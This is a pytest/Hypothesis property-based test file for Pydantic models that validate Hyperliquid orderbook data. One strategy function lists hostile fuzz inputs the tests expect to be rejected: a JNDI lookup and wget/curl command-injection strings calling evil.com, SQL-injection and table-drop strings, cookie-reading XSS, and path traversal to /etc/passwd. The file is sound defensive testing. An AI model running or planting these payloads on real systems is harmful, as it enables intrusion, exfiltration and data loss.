"""Property-based tests for Hyperliquid raw orderbook models.

These tests validate critical security boundary models that process external orderbook data.
The models tested here are essential for real-time market data, order book snapshots,
and price level tracking.

SECURITY CRITICAL: These raw models protect against:
- Malicious orderbook data that could manipulate price feeds and market information
- Financial precision errors in price and size calculations for trading decisions
- Buffer overflow attacks through oversized orderbook structures
- Injection attacks through malformed orderbook data
- Price manipulation through invalid price level data
- Volume manipulation that could affect liquidity calculations

Property testing ensures comprehensive coverage of orderbook edge cases and adversarial inputs.
"""

import json
from decimal import Decimal
from typing import Any, cast

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.exceptions.parsing import (
    SequenceLengthError,
    StructureTypeError,
)
from cyberdelta.apis.hyperliquid.models.hl_raw_orderbook import (
    HyperliquidRawBookLevel,
    HyperliquidRawL2Book,
    HyperliquidRawL2BookRequestPayload,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError, ParsingError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR ORDERBOOK MODEL TESTING
# =============================================================================


def coin_strategy() -> SearchStrategy[str]:
    """Generate valid coin/asset strings for orderbook.

    Returns:
        A Hypothesis strategy for valid coin/asset symbol strings.
    """
    return st.one_of([
        # Common cryptocurrencies
        st.sampled_from([
            "BTC",
            "ETH",
            "SOL",
            "USDC",
            "USDT",
            "AVAX",
            "ATOM",
            "DOT",
            "LINK",
            "UNI",
            "MATIC",
            "ADA",
            "XRP",
            "DOGE",
            "SHIB",
            "FTM",
            "NEAR",
            "ALGO",
            "MANA",
            "SAND",
        ]),
        # Generated asset names
        st.text(
            min_size=1,
            max_size=32,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd", "Pc", "Pd"], whitelist_characters="-_"
            ),
        ).filter(lambda x: x.strip() and len(x.encode("utf-8")) <= 64),
    ])


def price_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for orderbook prices.

    Returns:
        A Hypothesis strategy for decimal strings representing prices.
    """
    return st.one_of([
        # Common price values
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        # Common values
        st.just("0.01"),  # Small price
        st.just("1.0"),  # Unit price
        st.just("100.0"),  # Standard price
        st.just("1234.56"),  # Common price format
        st.just("50000.123456"),  # High-precision price
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation (valid for decimal parsing)
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
        # Negative prices (for testing - may be rejected)
        st.just("-100.0"),
        st.just("-0.01"),
    ])


def size_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for orderbook sizes (positive only).

    Returns:
        A Hypothesis strategy for positive decimal strings representing sizes.
    """
    return st.one_of([
        # Common size values
        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
        # Common values
        st.just("0.01"),  # Small size
        st.just("1.0"),  # Unit size
        st.just("100.0"),  # Standard size
        st.just("1000.123456"),  # High-precision size
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation
        st.just("1e2"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def timestamp_strategy() -> SearchStrategy[int]:
    """Generate valid timestamp values.

    Returns:
        A Hypothesis strategy for valid timestamp integers.
    """
    return st.one_of([
        # Valid timestamp ranges
        st.integers(min_value=0, max_value=2**31 - 1),
        st.integers(min_value=1640995200000, max_value=2147483647000),  # MS timestamp range
        # Common values
        st.just(0),  # Zero timestamp
        st.just(1641886630),  # Sample timestamp
        st.just(1741886630493),  # MS timestamp
        # Edge cases
        st.just(-1),  # Negative (may be allowed)
        st.just(2**63 - 1),  # Large timestamp
    ])


@st.composite
def valid_book_level_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid book level data.

    Returns:
        A dictionary with valid orderbook level data.
    """
    return {
        "px": draw(price_decimal_strategy()),
        "sz": draw(size_decimal_strategy()),
        "n": draw(st.integers(min_value=0, max_value=10000)),
    }


@st.composite
def valid_orderbook_levels_data(draw: st.DrawFn) -> list[list[dict[str, Any]]]:
    """Generate valid orderbook levels structure [bids, asks].

    Returns:
        A list containing two lists: [bids, asks] with orderbook level data.
    """
    bids = draw(st.lists(valid_book_level_data(), min_size=0, max_size=20))
    asks = draw(st.lists(valid_book_level_data(), min_size=0, max_size=20))
    return [bids, asks]


@st.composite
def valid_l2book_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid L2 book data.

    Returns:
        A dictionary with valid L2 orderbook data.
    """
    return {
        "coin": draw(coin_strategy()),
        "levels": draw(valid_orderbook_levels_data()),
        "time": draw(timestamp_strategy()),
    }


@st.composite
def valid_l2book_request_data(draw: st.DrawFn) -> dict[str, Any]:
    """Generate valid L2 book request payload data.

    Returns:
        A dictionary with valid L2 book request payload data.
    """
    return {
        "type": "l2Book",
        "coin": draw(coin_strategy()),
    }


def malicious_orderbook_strategy() -> SearchStrategy[object]:
    """Generate malicious values for orderbook security testing.

    Returns:
        A Hypothesis strategy for malicious values to test security boundaries.
    """
    return st.one_of([
        # Orderbook manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-orderbook}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('orderbook-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE orderbook;--"),
        st.just("1' UNION SELECT * FROM prices--"),
        # Buffer overflow attempts
        st.text(min_size=10000, max_size=50000),
        st.just("O" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.orderbook.find(); //"),
        # JSON injection
        st.just('{"$where": "this.price > 1000000"}'),
        # Price manipulation
        st.just("1000.0'; UPDATE prices SET price=0;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW BOOK LEVEL MODEL
# =============================================================================


class TestHyperliquidRawBookLevelProperties:
    """Property-based tests for HyperliquidRawBookLevel validation and security."""

    @given(level_data=valid_book_level_data())
    def test_book_level_validation_success_properties(self, level_data: dict[str, Any]) -> None:
        """Property: Valid book level data should always create valid BookLevel objects."""
        # Skip invalid data
        try:
            # Validate price and size fields
            for field in ["px", "sz"]:
                value = level_data[field]
                assume(isinstance(value, str) and value.strip())
                decimal_val = Decimal(value)
                assume(decimal_val.is_finite())
                if field == "sz":
                    assume(decimal_val > 0)  # Size must be positive

            # Validate count field
            n_value = level_data["n"]
            assume(isinstance(n_value, int) and n_value >= 0)

        except (ValueError, TypeError):
            assume(False)

        obj = HyperliquidRawBookLevel.model_validate(level_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawBookLevel)

        # Property: All fields should be preserved with correct types
        assert isinstance(obj.px, str)
        assert isinstance(obj.sz, str)
        assert obj.n == level_data["n"]

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("populate_by_name") is True
        assert obj.model_config.get("frozen") is True

    @given(
        field_name=st.sampled_from(["px", "sz", "n"]),
        malicious_value=malicious_orderbook_strategy(),
    )
    def test_book_level_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: Book level model should reject malicious inputs safely."""
        base_data = {
            "px": "123.45",
            "sz": "1.0",
            "n": 1,
        }
        base_data[field_name] = cast(Any, malicious_value)

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            ParsingError,
        )):
            HyperliquidRawBookLevel.model_validate(base_data)

    @given(
        field_name=st.sampled_from(["px", "sz"]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0.01"),
            st.just("100.50"),
            st.just("1e6"),
            st.just("2.5e-4"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
            # Negative values (may be invalid for sz)
            st.just("-100.0"),
            st.just("-0.01"),
        ]),
    )
    def test_book_level_decimal_validation_properties(
        self, field_name: str, decimal_value: str
    ) -> None:
        """Property: Book level decimal fields should validate properly."""
        level_data = {
            "px": "123.45",
            "sz": "1.0",
            "n": 1,
        }
        level_data[field_name] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()
            is_positive = decimal_val > 0

            if is_finite and not is_empty:
                # For sz (size), also check positive constraint
                if field_name == "sz" and not is_positive:
                    # Property: Non-positive size values should be rejected
                    with pytest.raises(ValidationError):
                        HyperliquidRawBookLevel.model_validate(level_data)
                else:
                    # Property: Valid finite decimals should be accepted
                    obj = HyperliquidRawBookLevel.model_validate(level_data)
                    assert isinstance(getattr(obj, field_name), str)
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, ParsingError)):
                    HyperliquidRawBookLevel.model_validate(level_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises((ValidationError, ParsingError)):
                HyperliquidRawBookLevel.model_validate(level_data)

    @given(
        n_value=st.one_of([
            # Valid values
            st.integers(min_value=0, max_value=10000),
            # Invalid values
            st.integers(min_value=-1000, max_value=-1),
            st.integers(min_value=10001, max_value=100000),
        ])
    )
    def test_book_level_count_validation_properties(self, n_value: int) -> None:
        """Property: Book level count field should validate non-negative integers."""
        level_data = {
            "px": "123.45",
            "sz": "1.0",
            "n": n_value,
        }

        if n_value >= 0:
            # Property: Non-negative values should be accepted
            obj = HyperliquidRawBookLevel.model_validate(level_data)
            assert obj.n == n_value
        else:
            # Property: Negative values should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawBookLevel.model_validate(level_data)

    @given(level_data=valid_book_level_data())
    def test_book_level_extra_fields_properties(self, level_data: dict[str, Any]) -> None:
        """Property: Book level model should forbid extra fields."""
        # Skip invalid data
        try:
            for field in ["px", "sz"]:
                assume(isinstance(level_data[field], str) and level_data[field].strip())
            assume(isinstance(level_data["n"], int) and level_data["n"] >= 0)
        except (TypeError, KeyError):
            assume(False)

        # Add extra fields
        level_data_with_extra = level_data.copy()
        level_data_with_extra["extra"] = "forbidden"
        level_data_with_extra["volume"] = "1000.0"

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawBookLevel.model_validate(level_data_with_extra)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW L2 BOOK MODEL
# =============================================================================


class TestHyperliquidRawL2BookProperties:
    """Property-based tests for HyperliquidRawL2Book validation and security."""

    @given(l2book_data=valid_l2book_data())
    def test_l2book_validation_success_properties(self, l2book_data: dict[str, Any]) -> None:
        """Property: Valid L2 book data should always create valid HyperliquidRawL2Book objects."""
        # Skip invalid data
        try:
            # Validate coin field
            assume(isinstance(l2book_data["coin"], str) and l2book_data["coin"].strip())

            # Validate timestamp
            assume(isinstance(l2book_data["time"], int))

            # Validate levels structure
            levels = l2book_data["levels"]
            assert isinstance(levels, list)
            levels_typed = cast(list[list[dict[str, Any]]], levels)
            assume(len(levels_typed) == 2)
            for level_list in levels_typed:
                assert isinstance(level_list, list)
                for level in level_list:
                    assert isinstance(level, dict)
                    for field in ["px", "sz"]:
                        value = level[field]
                        assert isinstance(value, str)
                        assume(value.strip())
                        decimal_val = Decimal(value)
                        assume(decimal_val.is_finite())
                        if field == "sz":
                            assume(decimal_val > 0)
                    assert isinstance(level["n"], int)
                    assume(level["n"] >= 0)
        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawL2Book.model_validate(l2book_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawL2Book)

        # Property: All fields should be preserved with correct types
        assert obj.coin == l2book_data["coin"]
        assert isinstance(obj.levels, list)
        assert len(obj.levels) == 2
        assert obj.time == l2book_data["time"]

    @given(
        field_name=st.sampled_from(["coin", "levels", "time"]),
        malicious_value=malicious_orderbook_strategy(),
    )
    def test_l2book_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: L2 book model should reject malicious inputs safely."""
        base_data = {
            "coin": "ETH",
            "levels": [
                [{"px": "123.45", "sz": "1.0", "n": 1}],
                [{"px": "124.00", "sz": "2.0", "n": 2}],
            ],
            "time": 1641886630,
        }
        base_data[field_name] = cast(Any, malicious_value)

        # Property: Malicious input should be rejected
        with pytest.raises((
            ValidationError,
            TypeError,
            EmptyStringError,
            TypeFieldError,
            StructureTypeError,
            SequenceLengthError,
        )):
            HyperliquidRawL2Book.model_validate(base_data)

    @given(
        levels_structure=st.one_of([
            # Valid structures
            st.just([[], []]),  # Empty bids and asks
            st.just([[{"px": "100.0", "sz": "1.0", "n": 1}], []]),  # Bids only
            st.just([[], [{"px": "101.0", "sz": "1.0", "n": 1}]]),  # Asks only
            # Invalid structures
            st.just([]),  # Empty list
            st.just([[]]),  # Single list
            st.just([[], [], []]),  # Three lists
            st.just("not_a_list"),  # Not a list
            st.just([[], "not_a_list"]),  # Second element not a list
            st.just(["not_a_list", []]),  # First element not a list
        ])
    )
    def test_l2book_levels_structure_validation_properties(self, levels_structure: object) -> None:
        """Property: L2 book levels structure should validate correctly."""
        l2book_data: dict[str, str | object | int] = {
            "coin": "ETH",
            "levels": levels_structure,
            "time": 1641886630,
        }

        # Check if structure is valid (exactly 2 lists)
        if isinstance(levels_structure, list):
            # Pyright needs explicit cast for list[Unknown] -> list[Any]
            levels_cast = cast(list[Any], levels_structure)
            is_valid = (
                len(levels_cast) == 2
                and all(isinstance(sublist, list) for sublist in levels_cast)
            )
        else:
            is_valid = False

        if is_valid:
            # Property: Valid structures should be accepted
            obj = HyperliquidRawL2Book.model_validate(l2book_data)
            assert len(obj.levels) == 2
        else:
            # Property: Invalid structures should be rejected
            with pytest.raises((ValidationError, StructureTypeError, SequenceLengthError)):
                HyperliquidRawL2Book.model_validate(l2book_data)

    def test_l2book_none_preprocessing_properties(self) -> None:
        """Property: L2 book model should handle None input by creating empty book."""
        # Property: None input should create empty book structure
        obj = HyperliquidRawL2Book.model_validate(None)
        assert obj.coin == "UNKNOWN"
        assert obj.levels == [[], []]
        assert obj.time == 0

    @given(l2book_data=valid_l2book_data())
    def test_l2book_extra_fields_properties(self, l2book_data: dict[str, Any]) -> None:
        """Property: L2 book model should forbid extra fields."""
        # Skip invalid data
        try:
            assume(isinstance(l2book_data["coin"], str) and l2book_data["coin"].strip())
            levels = l2book_data["levels"]
            assert isinstance(levels, list)
            # Pyright needs explicit cast for list[Unknown] -> list[Any] 
            assume(len(cast(list[Any], levels)) == 2)
        except (TypeError, KeyError):
            assume(False)

        # Add extra fields
        l2book_data_with_extra = l2book_data.copy()
        l2book_data_with_extra["extra"] = "forbidden"
        l2book_data_with_extra["depth"] = 10

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawL2Book.model_validate(l2book_data_with_extra)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW L2 BOOK REQUEST PAYLOAD MODEL
# =============================================================================


class TestHyperliquidRawL2BookRequestPayloadProperties:
    """Property-based tests for HyperliquidRawL2BookRequestPayload validation and security."""

    @given(request_data=valid_l2book_request_data())
    def test_l2book_request_validation_success_properties(
        self, request_data: dict[str, Any]
    ) -> None:
        """Property: Valid L2 book request data should create valid L2BookRequestPayload objects."""
        # Skip invalid data
        try:
            assume(isinstance(request_data["coin"], str) and request_data["coin"].strip())
            assume(request_data["type"] == "l2Book")
        except (TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawL2BookRequestPayload.model_validate(request_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawL2BookRequestPayload)

        # Property: All fields should be preserved with correct types
        assert obj.type == "l2Book"
        assert obj.coin == request_data["coin"]

    @given(
        field_name=st.sampled_from(["type", "coin"]), malicious_value=malicious_orderbook_strategy()
    )
    def test_l2book_request_security_boundary_properties(
        self, field_name: str, malicious_value: object
    ) -> None:
        """Property: L2 book request model should reject malicious inputs safely."""
        base_data = {
            "type": "l2Book",
            "coin": "ETH",
        }
        base_data[field_name] = cast(Any, malicious_value)

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            HyperliquidRawL2BookRequestPayload.model_validate(base_data)

    @given(
        request_type=st.one_of([
            st.just("l2Book"),
            st.just("orderbook"),
            st.just("book"),
            st.just("l2book"),
            st.just("L2Book"),
            st.just("invalid"),
            st.just(""),
        ])
    )
    def test_l2book_request_type_validation_properties(self, request_type: str) -> None:
        """Property: L2 book request type field should validate against literal value."""
        request_data = {
            "type": request_type,
            "coin": "ETH",
        }

        if request_type == "l2Book":
            # Property: Valid type should be accepted
            obj = HyperliquidRawL2BookRequestPayload.model_validate(request_data)
            assert obj.type == "l2Book"
        else:
            # Property: Invalid types should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawL2BookRequestPayload.model_validate(request_data)

    @given(request_data=valid_l2book_request_data())
    def test_l2book_request_extra_fields_properties(self, request_data: dict[str, Any]) -> None:
        """Property: L2 book request model should forbid extra fields."""
        # Skip invalid data
        try:
            assume(isinstance(request_data["coin"], str) and request_data["coin"].strip())
        except (TypeError, KeyError):
            assume(False)

        # Add extra fields
        request_data_with_extra = request_data.copy()
        request_data_with_extra["extra"] = "forbidden"
        request_data_with_extra["depth"] = 100

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawL2BookRequestPayload.model_validate(request_data_with_extra)


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawOrderbookIntegrationProperties:
    """Integration property tests for orderbook models working together."""

    @given(l2book_data=valid_l2book_data(), malicious_level=malicious_orderbook_strategy())
    def test_orderbook_models_integration_properties(
        self, l2book_data: dict[str, Any], malicious_level: object
    ) -> None:
        """Property: Orderbook models should work consistently together."""
        # Skip invalid data
        try:
            assume(isinstance(l2book_data["coin"], str) and l2book_data["coin"].strip())
            levels = l2book_data["levels"]
            assert isinstance(levels, list)
            # Pyright needs explicit cast for list[Unknown] -> list[Any] 
            assume(len(cast(list[Any], levels)) == 2)
        except (TypeError, KeyError):
            assume(False)

        # Property: Valid data should create valid objects
        if l2book_data["levels"][0]:  # Only test if bids exist
            obj = HyperliquidRawL2Book.model_validate(l2book_data)
            assert isinstance(obj, HyperliquidRawL2Book)

            # Test first bid level
            first_bid = obj.levels[0][0]
            assert isinstance(first_bid, HyperliquidRawBookLevel)

        # Property: Malicious level should be rejected when injected
        if l2book_data["levels"][0]:
            corrupted_data = l2book_data.copy()
            corrupted_data["levels"][0][0] = malicious_level

            with pytest.raises((
                ValidationError,
                TypeError,
                EmptyStringError,
                TypeFieldError,
                StructureTypeError,
            )):
                HyperliquidRawL2Book.model_validate(corrupted_data)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from(["coin", "levels", "time"]),
            malicious_orderbook_strategy(),
            min_size=2,
            max_size=3,
        )
    )
    def test_orderbook_models_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: All orderbook models should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected by L2 book model
        with pytest.raises((ValidationError, TypeError, StructureTypeError, SequenceLengthError)):
            HyperliquidRawL2Book.model_validate(complete_malicious_data)

    @given(level_data=valid_book_level_data(), request_data=valid_l2book_request_data())
    def test_orderbook_json_serialization_properties(
        self, level_data: dict[str, Any], request_data: dict[str, Any]
    ) -> None:
        """Property: Orderbook models should maintain JSON serialization compatibility."""
        # Skip invalid data
        try:
            # Validate level data
            for field in ["px", "sz"]:
                assume(isinstance(level_data[field], str) and level_data[field].strip())
                decimal_val = Decimal(level_data[field])
                assume(decimal_val.is_finite())
                if field == "sz":
                    assume(decimal_val > 0)
            assume(isinstance(level_data["n"], int) and level_data["n"] >= 0)

            # Validate request data
            assume(isinstance(request_data["coin"], str) and request_data["coin"].strip())

        except (ValueError, TypeError, KeyError):
            assume(False)

        # Test book level serialization
        level_obj = HyperliquidRawBookLevel.model_validate(level_data)
        level_json = level_obj.model_dump_json()
        level_parsed = json.loads(level_json)
        level_reconstructed = HyperliquidRawBookLevel.model_validate(level_parsed)
        assert isinstance(level_reconstructed.px, str)
        assert isinstance(level_reconstructed.sz, str)
        assert level_reconstructed.n == level_obj.n

        # Test request payload serialization
        request_obj = HyperliquidRawL2BookRequestPayload.model_validate(request_data)
        request_json = request_obj.model_dump_json()
        request_parsed = json.loads(request_json)
        request_reconstructed = HyperliquidRawL2BookRequestPayload.model_validate(request_parsed)
        assert request_reconstructed.type == "l2Book"
        assert request_reconstructed.coin == request_obj.coin


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawBookLevel_real_world_example() -> None:
    """Test with real-world book level data."""
    payload = {
        "px": "123.45",
        "sz": "1.0",
        "n": 1,
    }
    obj = HyperliquidRawBookLevel.model_validate(payload)
    assert obj.px == "123.45"
    assert obj.sz == "1"
    assert obj.n == 1


def test_HyperliquidRawL2Book_real_world_example() -> None:
    """Test with real-world L2 book data."""
    payload = {
        "coin": "ETH",
        "levels": [
            [{"px": "123.45", "sz": "1.0", "n": 1}, {"px": "123.40", "sz": "2.0", "n": 2}],
            [{"px": "123.50", "sz": "1.5", "n": 1}, {"px": "123.55", "sz": "3.0", "n": 3}],
        ],
        "time": 1641886630,
    }
    obj = HyperliquidRawL2Book.model_validate(payload)
    assert obj.coin == "ETH"
    assert len(obj.levels) == 2
    assert len(obj.levels[0]) == 2  # 2 bid levels
    assert len(obj.levels[1]) == 2  # 2 ask levels
    assert obj.time == 1641886630


def test_HyperliquidRawL2BookRequestPayload_real_world_example() -> None:
    """Test with real-world L2 book request data."""
    payload = {
        "type": "l2Book",
        "coin": "ETH",
    }
    obj = HyperliquidRawL2BookRequestPayload.model_validate(payload)
    assert obj.type == "l2Book"
    assert obj.coin == "ETH"


def test_HyperliquidRawL2Book_empty_levels_example() -> None:
    """Test with empty bid/ask levels."""
    payload: dict[str, str | list[list[dict[str, str | int]]] | int] = {
        "coin": "BTC",
        "levels": [[], []],
        "time": 1741886630,
    }
    obj = HyperliquidRawL2Book.model_validate(payload)
    assert obj.coin == "BTC"
    assert obj.levels == [[], []]
    assert obj.time == 1741886630


def test_HyperliquidRawBookLevel_scientific_notation_example() -> None:
    """Test with scientific notation in price/size fields."""
    payload = {
        "px": "1e2",
        "sz": "1.5e0",
        "n": 5,
    }
    obj = HyperliquidRawBookLevel.model_validate(payload)
    assert obj.px == "100"  # Normalized from 1e2
    assert obj.sz == "1.5"  # Normalized from 1.5e0
    assert obj.n == 5


def test_HyperliquidRawBookLevel_high_precision_example() -> None:
    """Test with high precision decimal values."""
    payload = {
        "px": "123.12345678",
        "sz": "0.00000001",
        "n": 1000,
    }
    obj = HyperliquidRawBookLevel.model_validate(payload)
    assert obj.px == "123.12345678"
    assert obj.sz == "0.00000001"
    assert obj.n == 1000


def test_HyperliquidRawL2Book_large_orderbook_example() -> None:
    """Test with large orderbook with many levels."""
    bids = [{"px": f"{100 - i * 0.01:.2f}", "sz": f"{i + 1}.0", "n": i + 1} for i in range(50)]
    asks = [{"px": f"{100 + i * 0.01:.2f}", "sz": f"{i + 1}.0", "n": i + 1} for i in range(50)]

    payload = {
        "coin": "SOL",
        "levels": [bids, asks],
        "time": 1641886630493,
    }
    obj = HyperliquidRawL2Book.model_validate(payload)
    assert obj.coin == "SOL"
    assert len(obj.levels[0]) == 50  # 50 bid levels
    assert len(obj.levels[1]) == 50  # 50 ask levels


def test_HyperliquidRawL2Book_context_symbol_preprocessing() -> None:
    """Test L2 book preprocessing with context symbol."""
    # Test with validation context containing symbol
    context = {"symbol": "BTC"}
    obj = HyperliquidRawL2Book.model_validate(None, context=context)
    assert obj.coin == "BTC"
    assert obj.levels == [[], []]
    assert obj.time == 0


def test_HyperliquidRawBookLevel_zero_values_example() -> None:
    """Test with zero values in book level."""
    payload = {
        "px": "0.01",
        "sz": "0.00000001",  # Minimum positive size
        "n": 0,  # Zero orders (allowed)
    }
    obj = HyperliquidRawBookLevel.model_validate(payload)
    assert obj.px == "0.01"
    assert obj.sz == "0.00000001"
    assert obj.n == 0


def test_HyperliquidRawL2Book_timestamp_edge_cases() -> None:
    """Test with edge case timestamp values."""
    payload: dict[str, str | list[list[dict[str, str | int]]] | int] = {
        "coin": "AVAX",
        "levels": [[], []],
        "time": 0,  # Zero timestamp
    }
    obj = HyperliquidRawL2Book.model_validate(payload)
    assert obj.time == 0

    # Test with large timestamp
    payload["time"] = 2**31 - 1
    obj = HyperliquidRawL2Book.model_validate(payload)
    assert obj.time == 2**31 - 1


def test_HyperliquidRawBookLevel_decimal_normalization_example() -> None:
    """Test decimal normalization in book level fields."""
    payload = {
        "px": "000123.4500",  # Leading/trailing zeros
        "sz": "001.000000",  # Leading/trailing zeros
        "n": 42,
    }
    obj = HyperliquidRawBookLevel.model_validate(payload)
    assert obj.px == "123.45"  # Normalized
    assert obj.sz == "1"  # Normalized
    assert obj.n == 42
